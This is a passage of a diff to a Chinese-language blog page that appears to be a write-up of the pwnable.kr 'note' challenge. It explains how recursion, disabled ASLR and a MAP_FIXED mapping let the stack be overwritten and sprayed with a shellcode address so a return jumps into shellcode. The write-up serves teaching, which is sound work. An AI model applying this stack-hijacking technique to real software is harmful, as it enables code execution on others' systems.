 <p>每一层函数返回时都会执行类似 <code>leave; ret</code> 的流程，从栈上恢复 <code>ebp</code> 并取出返回地址。前面我们已经把某段栈内容覆盖成了大量 shellcode note 的地址，因此只要某一次 <code>ret</code> 从这片区域取返回地址，控制流就会跳入 shellcode。</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b73 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b74 -->
+
 <h2 id="_7">为什么能够成功</h2>
+<!-- blog-edit-end:f3f39d50fdec694c:b74 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b75 -->
+
 <p>整个利用链可以概括为：</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b75 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b76 -->
+
 <ol>
 <li>递归菜单让栈不断向低地址增长。</li>
 <li>不开 ASLR 使初始栈地址固定，脚本可以估算当前栈区间。</li>
@@ -996,14 +1302,37 @@
 <li>覆盖栈页后，把未来返回路径上的内容铺成 shellcode 地址。</li>
 <li>递归返回时触发 <code>ret</code>，控制流跳入 shellcode。</li>
 </ol>
+<!-- blog-edit-end:f3f39d50fdec694c:b76 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b77 -->
+
 <p>这题最精髓的地方在于，不需要精确覆盖某一个保存返回地址。我们利用递归制造出一大片未来会被返回流程消费的栈空间，再用 <code>p32(shellcode_addr) * 1000</code> 粗暴铺满。只要某次 <code>ret</code> 从这片区域取值，就能完成劫持。</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b77 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b78 -->
+
 <h2 id="_8">总结</h2>
+<!-- blog-edit-end:f3f39d50fdec694c:b78 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b79 -->
+
 <p>这题可以学到两个很重要的点：</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b79 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b80 -->
+
 <ul>
 <li>不受控的递归会持续消耗栈空间，在关闭 ASLR 的场景下甚至可以变成可预测的利用条件。</li>
 <li><code>MAP_FIXED</code> 非常危险，它不是“如果地址可用就映射”，而是“强制把映射放在这里，即使要覆盖原有映射”。</li>
 </ul>
+<!-- blog-edit-end:f3f39d50fdec694c:b80 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b81 -->
+
 <p>因此，所谓的 <code>mmap_s()</code> 并没有让程序更安全，反而提供了覆盖栈映射的能力。配合可执行 note 页和地址泄露，最终就能稳定地把控制流导向 shellcode。</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b81 -->
+
+<div hidden data-text-edit-source="D:\Blog\done\系统性知识\信息安全\pwnable_kr\note\35.note.md" data-text-edit-revision="f3f39d50fdec694c7145b54df83afaead5f8ef205f5d50730f2022d54ee2555b" data-text-edit-marker="f3f39d50fdec694c" data-text-edit-schema="1"></div>
 
 
 
@@ -1235,8 +1564,6 @@
         <script src="../../../../../javascripts/resizable-sidebar.js"></script>
       
         <script src="../../../../../javascripts/sidebar-toggle-buttons.js"></script>
-      
-        <script src="../../../../../javascripts/review-tracker.js"></script>
       
         <script src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
       
